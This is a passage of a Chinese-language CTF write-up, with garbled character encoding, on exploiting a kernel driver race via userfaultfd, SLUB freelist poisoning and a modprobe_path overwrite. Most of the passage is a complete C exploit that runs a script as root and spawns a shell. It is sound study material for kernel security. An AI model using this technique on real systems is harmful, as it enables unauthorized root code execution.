<font color=red><strong>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæœ¬é¢˜ä¸­<code>do_SAK_work</code>è¿™ä¸ªåœ°å€å¹¶ä¸æ˜¯æ¯ä¸€æ¬¡éƒ½ä¼šå‡ºç°ï¼Œè€Œä¸”æœ‰å¯èƒ½å°è¯•å¾ˆå¤šæ¬¡éƒ½æ˜¯ä»€ä¹ˆéƒ½æ²¡æœ‰è¯»å–åˆ°ï¼Œéœ€è¦è¿›è¡Œå¤šæ¬¡å°è¯•æ‰èƒ½è·å–è¯¥åœ°å€ã€‚</strong></font></p>
<h2 id="2-é€šè¿‡modprobe_pathè¿›è¡Œåˆ©ç”¨"><a class="markdownIt-Anchor" href="#2-é€šè¿‡modprobe_pathè¿›è¡Œåˆ©ç”¨"></a> 2. é€šè¿‡<code>modprobe_path</code>è¿›è¡Œåˆ©ç”¨</h2>
<p>åœ¨è·å–äº†å†…æ ¸çš„åŸºåœ°å€ä¹‹åï¼Œæˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨ä¸€ä¸ªæ–°çš„åˆ©ç”¨æ–¹å¼â€”â€”<code>modprobe_path</code>æ¥è¿›è¡Œåé¢çš„åˆ©ç”¨äº†ã€‚</p>
<p>ï¼ˆèŠ‚é€‰è‡ªarttnba3å¸ˆå‚…çš„åšå®¢ï¼‰</p>
<blockquote>
<p>å½“æˆ‘ä»¬å°è¯•å»æ‰§è¡Œï¼ˆexecveï¼‰ä¸€ä¸ªéæ³•çš„æ–‡ä»¶ï¼ˆfile magic not foundï¼‰ï¼Œå†…æ ¸ä¼šç»å†å¦‚ä¸‹è°ƒç”¨é“¾</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">entry_SYSCALL_64()</span><br><span class="line">   sys_execve()</span><br><span class="line">     do_execve()</span><br><span class="line">       do_execveat_common()</span><br><span class="line">         bprm_execve()</span><br><span class="line">           exec_binprm()</span><br><span class="line">             search_binary_handler()</span><br><span class="line">               __request_module() <span class="comment">// wrapped as request_module</span></span><br><span class="line">                 call_modprobe()</span><br></pre></td></tr></table></figure>
</blockquote>
<p>ç”±äºæœ¬é¢˜çš„kernelç‰ˆæœ¬ä¸º5.3.6ï¼Œå› æ­¤æˆ‘ä»¬æ‰¾åˆ°è¿™ä¸ªç‰ˆæœ¬çš„<code>call_modprobe</code>å‡½æ•°çœ‹ä¸€ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/kmod.c line 70</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">call_modprobe</span><span class="params">(<span class="type">char</span> *module_name, <span class="type">int</span> wait)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> *<span class="title">info</span>;</span></span><br><span class="line">	<span class="type">static</span> <span class="type">char</span> *envp[] = &#123;</span><br><span class="line">		<span class="string">&quot;HOME=/&quot;</span>,</span><br><span class="line">		<span class="string">&quot;TERM=linux&quot;</span>,</span><br><span class="line">		<span class="string">&quot;PATH=/sbin:/usr/sbin:/bin:/usr/bin&quot;</span>,</span><br><span class="line">		<span class="literal">NULL</span></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> **argv = kmalloc(<span class="keyword">sizeof</span>(<span class="type">char</span> *[<span class="number">5</span>]), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!argv)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	module_name = kstrdup(module_name, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!module_name)</span><br><span class="line">		<span class="keyword">goto</span> free_argv;</span><br><span class="line"></span><br><span class="line">	argv[<span class="number">0</span>] = modprobe_path;</span><br><span class="line">	argv[<span class="number">1</span>] = <span class="string">&quot;-q&quot;</span>;</span><br><span class="line">	argv[<span class="number">2</span>] = <span class="string">&quot;--&quot;</span>;</span><br><span class="line">	argv[<span class="number">3</span>] = module_name;	<span class="comment">/* check free_modprobe_argv() */</span></span><br><span class="line">	argv[<span class="number">4</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,</span><br><span class="line">					 <span class="literal">NULL</span>, free_modprobe_argv, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (!info)</span><br><span class="line">		<span class="keyword">goto</span> free_module_name;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> call_usermodehelper_exec(info, wait | UMH_KILLABLE);</span><br><span class="line"></span><br><span class="line">free_module_name:</span><br><span class="line">	kfree(module_name);</span><br><span class="line">free_argv:</span><br><span class="line">	kfree(argv);</span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­<code>modprobe_path</code>è¢«å®šä¹‰åœ¨dataæ®µä¸­ï¼Œå€¼ä¸º<code>/sbin/modprobe</code>ã€‚è€Œ<code>call_usermodehelper_exec</code>å‡½æ•°ä¼š<font color=red><strong>ä»¥rootæƒé™</strong></font>æ‰§è¡Œè¿™ä¸ªç¨‹åºã€‚ç”±äºdataæ®µå¯å†™ï¼Œå› æ­¤å¦‚æœèƒ½å¤Ÿå°†<code>modprobe_path</code>çš„å€¼æ”¹å†™ï¼Œå°±å¯ä»¥æ‰§è¡Œä»»æ„shellè„šæœ¬äº†ã€‚</p>
<p>é‚£ä¹ˆåº”è¯¥å¦‚ä½•ä¿®æ”¹<code>modprobe_path</code>å‘¢ï¼Ÿè¿™é‡Œå°±éœ€è¦ç”¨åˆ°æˆ‘ä»¬å¯¹äºslubå†…æ ¸å†…å­˜åˆ†é…ç³»ç»Ÿçš„ç†è§£äº†ã€‚åœ¨å‰é¢ç¬”è€…å¹¶æ²¡æœ‰å¯¹linuxå†…æ ¸çš„å†…å­˜åˆ†é…ç³»ç»Ÿä½œè¯¦å°½çš„è§£é‡Šï¼Œå¯ä»¥å‚è€ƒä¸‹é¢çš„èµ„æ–™è¿›è¡Œäº†è§£ï¼Œåé¢ç¬”è€…ä¹Ÿä¼šè¿›è¡Œè¿›ä¸€æ­¥çš„å­¦ä¹ å’Œåˆ†æï¼š</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/tolimit/p/4551428.html">é¡µæ¡†åˆ†é…å™¨</a><br />
<a target="_blank" rel="noopener" href="https://www.cnblogs.com/tolimit/p/4566189.html">SLABæ¦‚è¿°</a><br />
<a target="_blank" rel="noopener" href="https://blog.csdn.net/wh8_2011/article/details/52287557?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166522587916800182720892%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=166522587916800182720892&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-4-52287557-null-null.142%5Ev52%5Ejs_top,201%5Ev3%5Econtrol_1&amp;utm_term=slub&amp;spm=1018.2226.3001.4187">SLUBæ¦‚è¿°</a></p>
<p>åœ¨æœ¬é¢˜ä¸­ï¼Œæˆ‘ä»¬åªéœ€è¦æ¸…æ¥šSLUBåˆ†é…å™¨çš„ä¸€ä¸ªç‰¹æ€§ï¼š<font color=red><strong>SLUBåˆ†é…å™¨ä¸­æœ‰å¤šä¸ªå†…å­˜å—ï¼ˆç¬”è€…ç§°ä½œcacheï¼‰ï¼Œåœ¨ä¸€ä¸ªè¢«é‡Šæ”¾çš„cacheçš„æœ€å‰é¢ä¿å­˜çš„æ˜¯ä¸‹ä¸€ä¸ªå¯ç”¨çš„cacheåœ°å€</strong></font>ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿåˆ©ç”¨æ¡ä»¶ç«äº‰æ¼æ´å»ä¿®æ”¹ä¸€ä¸ªå·²ç»è¢«é‡Šæ”¾çš„cacheçš„æœ€å‰8ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆä¸‹ä¸€æ¬¡åˆ†é…èƒ½å¤Ÿåˆ†é…åˆ°è¯¥chunkçš„è¯ï¼Œå†ä¸‹ä¸€æ¬¡å°±èƒ½å¤Ÿåˆ†é…åˆ°ä»»ä¸€åœ°å€å»ã€‚ä¹Ÿæ­£æ˜¯åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥å°†<code>modprobe_path</code>çš„åœ°å€å†™åˆ°è¢«é‡Šæ”¾çš„cacheä¸­ï¼Œç„¶åå†è¿›è¡Œä¸¤æ¬¡åˆ†é…å³å¯åˆ†é…åˆ°<code>modprobe_path</code>å¤„çš„åœ°å€ï¼Œå¹¶é€šè¿‡<code>edit</code>å‡½æ•°éšæ„è¿›è¡Œæ”¹å†™ã€‚æœ‰å…³äºLinuxå†…æ ¸å†…å­˜åˆ†é…æœºåˆ¶ï¼Œç¬”è€…å°†ä¼šåœ¨ä¸‹ä¸€ç¯‡æ–‡ç« ä¸­è¿›è¡Œè¯¦ç»†ä»‹ç»ï¼Œè¿™é‡Œæˆ‘ä»¬åªéœ€è¦çŸ¥é“ä¸Šé¢è¿™ä¸€ç‚¹å°±å¯ä»¥äº†ã€‚åŒæ—¶è¿˜éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨åˆ†é…åˆ°<code>modprobe_path</code>ä¹‹åï¼Œç”±äºæˆ‘ä»¬å·²ç»ç ´åäº†SLUBçš„ç»“æ„ï¼Œå› æ­¤å¦‚æœç›´æ¥ç»“æŸè¿›ç¨‹ï¼Œä¼šå¯¼è‡´<code>kernel panic</code>ï¼Œæœ¬é¢˜ä¸­æˆ‘ä»¬åªéœ€è¦åœ¨<code>modprobe_path</code>åˆ©ç”¨ä¹‹å‰ç¼–å†™ä¸€ä¸ªè„šæœ¬å°†flagæ–‡ä»¶çš„æƒé™æ”¹æˆ777ï¼Œååˆ©ç”¨æ¡ä»¶ç«äº‰æ¼æ´å°†<code>modprobe_path</code>ä¿®æ”¹ä¸ºè¿™ä¸ªè„šæœ¬çš„è·¯å¾„ï¼Œç„¶åæ‰§è¡Œä¸€ä¸ªéæ³•æ–‡ä»¶è§¦å‘<code>modprobe_path</code>æ¼æ´ï¼Œä»¥rootæƒé™æ‰§è¡Œè¿™ä¸ªè„šæœ¬ï¼Œåé¢æˆ‘ä»¬å°±èƒ½å¤Ÿç›´æ¥é€šè¿‡<code>read</code>è¯»å–flagæ–‡ä»¶çš„å†…å®¹äº†ã€‚å› æ­¤<strong>æœ¬é¢˜çš„åˆ©ç”¨æ–¹å¼å¹¶ä¸æ˜¯ææƒ</strong>ã€‚</p>
<p>å¦‚æ­¤ä¸€æ¥ï¼Œæ€è·¯å°±æ¸…æ™°äº†ï¼Œexpè‡ªç„¶å°±ä¿¡æ‰‹æ‹ˆæ¥äº†ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by ubuntu on 22-10-5.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">input</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span>&#123;</span></span><br><span class="line">        <span class="type">size_t</span> size;</span><br><span class="line">        <span class="type">size_t</span> index;</span><br><span class="line">    &#125;info;</span><br><span class="line">    <span class="type">char</span>* buf;</span><br><span class="line">&#125;input;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET 0x2333</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD 0x1337</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EDIT 0x8888</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEL 0x6666</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_STRUCT_SIZE 0x2E0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DO_SAK_WORK_ADDR 0xFFFFFFFF815D4EF0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xFFFFFFFF810B3040</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xFFFFFFFF810B3390</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MODPROBE_PATH 0xFFFFFFFF8245C5C0</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span>* faultBuffer;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> index, <span class="type">char</span>* buffer)</span>&#123;</span><br><span class="line">    input in = &#123;</span><br><span class="line">            .info.index = index,</span><br><span class="line">            .buf = buffer,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, GET, &amp;in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> size)</span>&#123;</span><br><span class="line">    input in = &#123;</span><br><span class="line">            .info.size = size,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, ADD, &amp;in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dele</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">    input in = &#123;</span><br><span class="line">            .info.index = index,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, DEL, &amp;in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">(<span class="type">int</span> index, <span class="type">char</span>* buffer)</span>&#123;</span><br><span class="line">    input in = &#123;</span><br><span class="line">            .info.index = index,</span><br><span class="line">            .buf = buffer,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, EDIT, &amp;in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *page = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> page_size;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">fault_handler_thread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="type">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="type">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="type">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="type">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(GREEN <span class="string">&quot;Parent process stopped here.&quot;</span> CEND);</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                          ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    saveStatus();</span><br><span class="line">    page_size = sysconf(_SC_PAGE_SIZE);</span><br><span class="line">    page = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="string">&#x27;0&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    faultBuffer = (<span class="type">char</span>*)mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    registerUserFaultFd(faultBuffer, <span class="number">0x1000</span>, (<span class="type">void</span>*)fault_handler_thread);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> shellFile = open(<span class="string">&quot;/getFlag&quot;</span>, O_RDWR | O_CREAT);</span><br><span class="line">    <span class="type">char</span>* shellCode = <span class="string">&quot;#!/bin/sh\n&quot;</span></span><br><span class="line">                      <span class="string">&quot;chmod 777 /flag&quot;</span>;</span><br><span class="line">    write(shellFile, shellCode, <span class="built_in">strlen</span>(shellCode));</span><br><span class="line">    close(shellFile);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /getFlag&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/knote&quot;</span>, O_RDWR);</span><br><span class="line">    add(TTY_STRUCT_SIZE);</span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;Fork failed&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(GREEN <span class="string">&quot;Child process sleeping...&quot;</span> CEND);</span><br><span class="line">        sleep(<span class="number">2</span>);</span><br><span class="line">        <span class="built_in">puts</span>(GREEN <span class="string">&quot;Ready to delete note in child process...&quot;</span> CEND);</span><br><span class="line">        dele(<span class="number">0</span>);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">puts</span>(GREEN <span class="string">&quot;Ready to open /dev/ptmx in child process...&quot;</span> CEND);</span><br><span class="line">        open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">        get(<span class="number">0</span>, faultBuffer);</span><br><span class="line"></span><br><span class="line">    print_binary(faultBuffer, TTY_STRUCT_SIZE);</span><br><span class="line">    <span class="type">u_int64_t</span> do_sak_work = *((<span class="type">u_int64_t</span>*)(faultBuffer + <span class="number">0x2B0</span>));</span><br><span class="line">    <span class="keyword">if</span>(!do_sak_work)</span><br><span class="line">        errExit(<span class="string">&quot;Failed to get do_SAK_work!&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(GREEN <span class="string">&quot;Successfully got address of do_SAK_work: %#zx&quot;</span> CEND, do_sak_work);</span><br><span class="line">    <span class="type">u_int64_t</span> offset = do_sak_work - DO_SAK_WORK_ADDR;  <span class="comment">// offset got</span></span><br><span class="line"></span><br><span class="line">    commit_creds = offset + COMMIT_CREDS;               <span class="comment">// get address of commit_creds</span></span><br><span class="line">    prepare_kernel_cred = offset + PREPARE_KERNEL_CRED; <span class="comment">// get address of prepare_kernel_cred</span></span><br><span class="line">    <span class="type">u_int64_t</span> modprobe_path = offset + MODPROBE_PATH;   <span class="comment">// get address of modprobe_path</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(page, &amp;modprobe_path, <span class="number">8</span>);</span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;Fork failed&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(GREEN <span class="string">&quot;Child process sleeping...&quot;</span> CEND);</span><br><span class="line">        sleep(<span class="number">2</span>);</span><br><span class="line">        <span class="built_in">puts</span>(GREEN <span class="string">&quot;Ready to delete note in child process...&quot;</span> CEND);</span><br><span class="line">        dele(<span class="number">0</span>);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">puts</span>(GREEN <span class="string">&quot;Ready to open /dev/ptmx in child process...&quot;</span> CEND);</span><br><span class="line">        open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">        edit(<span class="number">0</span>, page);</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x100</span>);</span><br><span class="line">    add(<span class="number">0x100</span>);     <span class="comment">// this cache allocates to modprobe_path</span></span><br><span class="line">    edit(<span class="number">1</span>, <span class="string">&quot;/getFlag&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\xff\xff\xff\xff&#x27; &gt; /hook&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /hook&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/hook&quot;</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="type">int</span> flag = open(<span class="string">&quot;/flag&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(flag &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;Failed to open flag file!&quot;</span>);</span><br><span class="line">    <span class="type">char</span> flagContent[<span class="number">0x50</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(flag, flagContent, <span class="number">0x50</span>);</span><br><span class="line">    write(<span class="number">1</span>, flagContent, <span class="number">0x50</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);	<span class="comment">// to prevent kernel panic</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 